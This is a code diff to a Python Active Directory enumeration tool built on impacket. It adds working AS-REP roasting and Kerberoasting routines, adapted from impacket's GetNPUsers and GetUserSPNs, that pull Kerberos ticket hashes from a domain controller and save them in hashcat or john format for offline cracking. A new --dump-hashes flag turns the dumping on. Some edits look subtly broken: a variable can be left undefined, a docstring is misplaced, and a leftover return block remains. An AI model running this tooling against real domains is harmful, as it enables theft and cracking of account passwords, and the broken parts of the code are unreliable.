@@ -20,6 +20,11 @@ import sys
 import argparse
 import ipaddress
 import socket
+import datetime
+import random
+from binascii import hexlify, unhexlify
+from pyasn1.codec.der import decoder, encoder
+from pyasn1.type.univ import noValue
 
 from impacket.dcerpc.v5 import samr, transport, dcomrt
 from impacket.dcerpc.v5.dcom import wmi
@@ -27,8 +32,9 @@ from impacket.dcerpc.v5.ndr import NULL
 from impacket.dcerpc.v5.samr import DCERPCException
 from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE
 from impacket.krb5 import constants
-from impacket.krb5.kerberosv5 import getKerberosTGT
-from impacket.krb5.types import Principal
+from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, TGS_REP, seq_set, seq_set_iter
+from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT, getKerberosTGS
+from impacket.krb5.types import KerberosTime, Principal
 from impacket.nmb import NetBIOSError
 from impacket.smb3 import FILE_ATTRIBUTE_DIRECTORY
 from impacket.smbconnection import SMBConnection, SessionError
@@ -59,6 +65,162 @@ def print_section_header(title):
     print("=" * 60 + "\n")
 
 
+# --- Class from GetNPUsers.py for AS-REP Roasting ---
+class GetUserNoPreAuth:
+    def __init__(self, domain, format='hashcat', kdc_ip=None):
+        self.__domain = domain
+        self.__outputFormat = format
+        self.__kdcIP = kdc_ip
+
+    def getTGT(self, userName, requestPAC=False):
+        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+        asReq = AS_REQ()
+        domain = self.__domain.upper()
+        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+
+        pacRequest = KERB_PA_PAC_REQUEST()
+        pacRequest['include-pac'] = requestPAC
+        encodedPacRequest = encoder.encode(pacRequest)
+
+        asReq['pvno'] = 5
+        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+
+        asReq['padata'] = noValue
+        asReq['padata'][0] = noValue
+        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+        asReq['padata'][0]['padata-value'] = encodedPacRequest
+
+        reqBody = seq_set(asReq, 'req-body')
+
+        opts = list()
+        opts.append(constants.KDCOptions.forwardable.value)
+        opts.append(constants.KDCOptions.renewable.value)
+        opts.append(constants.KDCOptions.proxiable.value)
+        reqBody['kdc-options'] = constants.encodeFlags(opts)
+
+        seq_set(reqBody, 'sname', serverName.components_to_asn1)
+        seq_set(reqBody, 'cname', clientName.components_to_asn1)
+
+        reqBody['realm'] = domain
+
+        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
+        reqBody['till'] = KerberosTime.to_asn1(now)
+        reqBody['rtime'] = KerberosTime.to_asn1(now)
+        reqBody['nonce'] = random.getrandbits(31)
+
+        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
+
+        seq_set_iter(reqBody, 'etype', supportedCiphers)
+
+        message = encoder.encode(asReq)
+
+        try:
+            r = sendReceive(message, domain, self.__kdcIP)
+        except KerberosError as e:
+            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
+                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
+                seq_set_iter(reqBody, 'etype', supportedCiphers)
+                message = encoder.encode(asReq)
+                r = sendReceive(message, domain, self.__kdcIP)
+            else:
+                raise e
+
+        try:
+            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
+        except:
+            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)
+
+        if self.__outputFormat == 'john':
+            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
+                return '$krb5asrep$%d$%s%s$%s$%s' % (asRep['enc-part']['etype'], domain, clientName,
+                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode(),
+                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode())
+            else:
+                return '$krb5asrep$%s@%s:%s$%s' % (clientName, domain,
+                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
+                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
+        else:
+            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
+                return '$krb5asrep$%d$%s$%s$%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
+                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode(),
+                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[:-12:]).decode())
+            else:
+                return '$krb5asrep$%d$%s@%s:%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
+                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
+                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
+
+# --- Class from GetUserSPNs.py for Kerberoasting ---
+class GetUserSPNs:
+    def __init__(self, username, password, domain, aesKey='', lmhash='', nthash='', kdc_ip=None, output_format='hashcat'):
+        self.__username = username
+        self.__password = password
+        self.__domain = domain
+        self.__lmhash = lmhash
+        self.__nthash = nthash
+        self.__aesKey = aesKey
+        self.__kdcIP = kdc_ip
+        self.__outputFormat = output_format
+        self.__doKerberos = False  # Assume password auth for integration
+
+    def getTGT(self):
+        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
+                                                                unhexlify(self.__lmhash), unhexlify(self.__nthash),
+                                                                self.__aesKey, kdcHost=self.__kdcIP)
+        TGT = {'KDC_REP': tgt, 'cipher': cipher, 'sessionKey': sessionKey}
+        return TGT
+
+    def outputTGS(self, ticket, oldSessionKey, sessionKey, username, spn, fd=None):
+        decodedTGS = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
+        etype = decodedTGS['ticket']['enc-part']['etype']
+        if etype == constants.EncryptionTypes.rc4_hmac.value:
+            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
+                etype, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
+        elif etype == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
+            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
+                etype, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
+        elif etype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
+            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
+                etype, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
+        elif etype == constants.EncryptionTypes.des_cbc_md5.value:
+            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
+                etype, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
+                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
+        else:
+            print_error(f'Skipping incompatible e-type {etype} for {username}')
+            return
+
+        print_vulnerable(f'Hash for {username}: {entry}')
+        if fd:
+            fd.write(entry + '\n')
+
+    def request_multiple_TGSs(self, usernames, output_dir=None):
+        hash_file = f'{output_dir}/kerberoast_hashes.txt' if output_dir else 'kerberoast_hashes.txt'
+        with open(hash_file, 'w+') as fd:
+            TGT = self.getTGT()
+            for username in usernames:
+                try:
+                    downLevelLogonName = self.__domain + '/' + username
+                    principalName = Principal()
+                    principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value  # Using enterprise for compatibility
+                    principalName.components = [username + '@' + self.__domain.upper()]  # UPN format
+                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain, self.__kdcIP,
+                                                                            TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
+                    self.outputTGS(tgs, oldSessionKey, sessionKey, username, downLevelLogonName, fd)
+                except Exception as e:
+                    print_error(f'Failed to roast {username}: {str(e)}')
+        print_success(f'Kerberoast hashes saved to {hash_file}')
+
+
 # --- Anonymous/Null Session Functions ---
 
 def check_smb_null_session(target_ip):
@@ -68,7 +230,7 @@ def check_smb_null_session(target_ip):
     """
     found_sensitive_file = False
     SHARES_TO_SKIP = ('IPC$', 'PRINT$')
-    SENSITIVE_EXTS = ('.xml', '.txt', '.ini', '.config', '.kdbx', '.toml')
+    SENSITIVE_EXTS = ('.xml', '.txt', '.ini', '.config', '.kdbx', '.toml', '.cfg', '.pdf')
 
     def list_smb_path(conn, share, path):
         nonlocal found_sensitive_file
@@ -335,12 +497,10 @@ def enumerate_users_samr(target_ip):
     print_fail("FAILED: Anonymous SAMR enumeration is NOT allowed.")
     return []
 
-def check_asrep_roastable_users(target_ip, domain_dn, user_list):
+def check_asrep_roastable_users(target_ip, domain_dn, user_list, dump_hashes=False, hash_format='hashcat', output_dir=None):
     """
-    Checks for the AS-REP Roasting vulnerability by attempting to get a TGT
-    for each user without pre-authentication. Returns a list of vulnerable users.
+    ASEP-Roast discovered users.
     """
-    # TODO: Get TGT and print to screen in hashcat format
     if not domain_dn or not user_list:
         print_info("Skipping AS-REP Roast check (missing domain or user list).")
         return []
@@ -348,27 +508,29 @@ def check_asrep_roastable_users(target_ip, domain_dn, user_list):
     print_info("Checking for AS-REP Roastable users...")
     domain_name = domain_dn.replace("DC=", "").replace(",", ".")
     roastable_users = []
+    hash_file = f'{output_dir}/asrep_hashes.txt' if output_dir else 'asrep_hashes.txt'
+    fd = open(hash_file, 'w+') if dump_hashes else None
+
+    roaster = GetUserNoPreAuth(domain_name, hash_format, target_ip)
 
     for username in user_list:
         try:
-            princ = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-            getKerberosTGT(princ, '', domain_name, '', '', '', kdcHost=target_ip)
+            entry = roaster.getTGT(username)
+            print_vulnerable(f"VULNERABLE: User '{username}' is AS-REP Roastable!")
+            print_success(f"Hash: {entry}")
+            roastable_users.append(username)
+            if fd:
+                fd.write(entry + '\n')
         except Exception as e:
             error_string = str(e)
-            if "KDC_ERR_PREAUTH_REQUIRED" in error_string:
-                pass  # Secure case
-            elif "SessionKeyDecryptionError" in error_string or "ciphertext integrity failure" in error_string:
-                print_vulnerable(f"VULNERABLE: User '{username}' is AS-REP Roastable!")
-                roastable_users.append(username)
-            elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in error_string:
-                pass
+            if "PREAUTH_REQUIRED" in error_string or "PRINCIPAL_UNKNOWN" in error_string:
+                pass  # Not vulnerable
             else:
                 print_error(f"Kerberos error for '{username}': {e}")
 
-    if not roastable_users:
-        print_secure("No AS-REP roastable users found.")
-    
-    return roastable_users
+    if fd:
+        fd.close()
+        print_success(f"AS-REP hashes saved to {hash_file}")
 
     if not roastable_users:
         print_secure("No AS-REP roastable users found.")
@@ -484,7 +646,8 @@ def enumerate_smb_shares_auth(target_ip, domain, username, password, lmhash, nth
     except Exception as e:
         print_fail(f"Connection Error: {e}")
 
-def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash):
+def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash, dump_hashes=False, hash_format='hashcat', output_dir=None):
+    findings = {'spns': [], 'admin_users': []}
     """
     Performs a comprehensive, authenticated LDAP enumeration.
     Returns the domain's search_base, a list of the user's groups, and a
@@ -498,8 +661,6 @@ def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash):
 
     try:
         server = Server(target_ip, get_info=ALL)
-        # ldap3's NTLM auth handler uses impacket, which can take the hash in the password field
-        # if it's formatted correctly for NTLM.
         auth_password = f"{lmhash}:{nthash}" if lmhash and nthash else password
         conn = Connection(server, user=user_dn, password=auth_password, authentication=NTLM, auto_bind=True)
         print_success(f"LDAP Bind Successful as {user_dn}")
@@ -565,15 +726,15 @@ def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash):
         conn.search(search_base, spn_filter, attributes=['sAMAccountName', 'servicePrincipalName'])
         if conn.entries:
             print_success("  Found user accounts with SPNs (Potential Kerberoast Targets):")
+            spn_users = []  # Collect users for roasting
             for entry in conn.entries:
                 u = entry.sAMAccountName.value
                 spn_val = entry.servicePrincipalName.value
                 if isinstance(spn_val, list):
                     spn_val = spn_val[0]
-                
-                # Differentiate between user and machine accounts for suggestions
                 if not u.endswith('$'):
                     findings['spns'].append({'user': u, 'spn': spn_val})
+                    spn_users.append(u)
                     print(f"    > {Style.YELLOW}{u:<20}{Style.RESET} (SPN: {spn_val})")
                 else:
                     print(f"    > {Style.CYAN}{u:<20}{Style.RESET} (SPN: {spn_val}) [Machine Account]")
@@ -596,7 +757,13 @@ def enumerate_ldap_auth(target_ip, domain, username, password, lmhash, nthash):
         print_fail(f"Could not connect to LDAP port 389 on {target_ip}")
     except Exception as e:
         print_fail(f"LDAP Error: {e}")
-    return None, [], findings
+
+    if dump_hashes and spn_users:
+        print_section_header("Kerberoasting Hashes")
+        roaster = GetUserSPNs(username, password, domain, '', lmhash, nthash, target_ip, hash_format)
+        roaster.request_multiple_TGSs(spn_users, output_dir)
+
+    return search_base, user_groups, findings
 
 def find_ad_misconfigs_auth(target_ip, domain, username, password, lmhash, nthash, search_base):
     """
@@ -703,25 +870,6 @@ def print_suggestions(target_ip, findings, auth_creds=None):
         print("  An SPN for ADCS was found. This indicates the presence of a Certificate Authority.")
         print("  You should enumerate it for misconfigurations (e.g., ESC1, ESC8) using Certipy.")
         print(f"  > {Style.CYAN}certipy find -u '<user>@<domain>' -p '<password>' -dc-ip {target_ip} -ca '{ca_name}'{Style.RESET}\n")
-        suggestions_made = True
-
-    if findings.get('asrep_users'):
-        print_info("No specific vulnerabilities found to generate suggestions for.")
-        print(f"{Style.YELLOW}[!] AS-REP Roastable Users Found:{Style.RESET}")
-        domain = findings.get('domain_name', '<DOMAIN.LOCAL>')
-        print("  The following users do not require Kerberos pre-authentication.")
-        print("  You can attempt to get their password hashes for offline cracking.")
-        print(f"  > {Style.CYAN}GetNPUsers.py {domain}/ -dc-ip {target_ip} -no-pass -usersfile ad_users.txt -outputfile asrep.hashes{Style.RESET}\n")
-        suggestions_made = True
-
-    if findings.get('spns') and auth_creds: # 'spns' now only contains user accounts
-        print(f"{Style.YELLOW}[!] Kerberoastable SPNs Found:{Style.RESET}")
-        domain, user = parse_identity(auth_creds['username'])
-        target_domain = findings.get('domain_name', domain).upper()
-        creds_part = f"-hashes 'aad3b435b51404eeaad3b435b51404ee:{auth_creds['nthash']}' " if auth_creds.get('nthash') else ""
-        print("  Service Principal Names (SPNs) associated with user accounts were found.")
-        print("  You can attempt to request service tickets for them and crack the hashes offline.")
-        print(f"  > {Style.CYAN}GetUserSPNs.py -dc-ip {target_ip} {creds_part}-request -outputfile tgs.hashes {target_domain}/{user}{Style.RESET}\n")
         suggestions_made = True
 
     if findings.get('unconstrained_delegation'):
@@ -833,13 +981,18 @@ Examples:
 """,
         formatter_class=argparse.RawDescriptionHelpFormatter
     )
-
+    
     parser.add_argument("target", help="The target IP address of the Domain Controller.")
 
     auth_group = parser.add_argument_group('Authenticated Scan Options')
-    auth_group.add_argument("-u", "--username", help="Username for authentication (e.g., 'user' or 'DOMAIN/user').")
+    auth_group.add_argument("-u", "--username", help="Username for authentication (e.g., 'DOMAIN/user').")
     auth_group.add_argument("-p", "--password", help="Password for authentication.")
     auth_group.add_argument("-H", "--hashes", help="LM:NT hash for Pass-the-Hash authentication.")
+
+    hash_group = parser.add_argument_group('Hash Dumping Options')
+    hash_group.add_argument("--dump-hashes", action='store_true', help="Dump AS-REP and Kerberoast hashes (if found).")
+    hash_group.add_argument("--hash-format", choices=['john', 'hashcat'], default='hashcat', help="Format for dumped hashes.")
+    hash_group.add_argument("--output-dir", help="Directory to save hash files (default: current dir).")
 
     args = parser.parse_args()
 
